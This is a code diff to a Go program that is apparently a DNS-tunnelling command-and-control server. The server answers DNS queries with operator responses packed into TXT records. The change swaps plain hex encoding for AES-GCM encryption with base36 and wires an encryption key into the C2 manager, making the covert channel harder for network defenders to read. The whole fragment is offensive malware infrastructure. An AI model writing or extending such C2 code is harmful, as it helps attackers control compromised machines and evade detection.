@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/hex"
 	"flag"
 	"fmt"
 	"math/rand"
@@ -234,20 +233,25 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					})
 				}
 
-			case 16: // TXT record - encode response as hex in TXT
-				hexEncoded := hex.EncodeToString([]byte(c2Response))
+			case 16: // TXT record - encode response with AES-GCM + base36
+				encoded, encErr := encryptAndEncode(c2Response, c2Manager.aesKey)
+				if encErr != nil {
+					// Fallback to plain response if encryption fails
+					encoded = c2Response
+				}
+
 				// TXT records need proper length-prefixed format
 				// Each string in a TXT record can be max 255 bytes
 				var txtData []byte
 
 				// Split into 255-byte chunks if needed
-				for len(hexEncoded) > 0 {
-					chunkSize := len(hexEncoded)
+				for len(encoded) > 0 {
+					chunkSize := len(encoded)
 					if chunkSize > 255 {
 						chunkSize = 255
 					}
-					chunk := hexEncoded[:chunkSize]
-					hexEncoded = hexEncoded[chunkSize:]
+					chunk := encoded[:chunkSize]
+					encoded = encoded[chunkSize:]
 
 					// Add length prefix and chunk
 					txtData = append(txtData, byte(len(chunk)))
@@ -447,7 +451,7 @@ func main() {
 	debugMode = cfg.Debug
 
 	// Initialize C2Manager
-	c2Manager = NewC2Manager(debugMode)
+	c2Manager = NewC2Manager(debugMode, cfg.EncryptionKey)
 
 	bindAddr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)
 
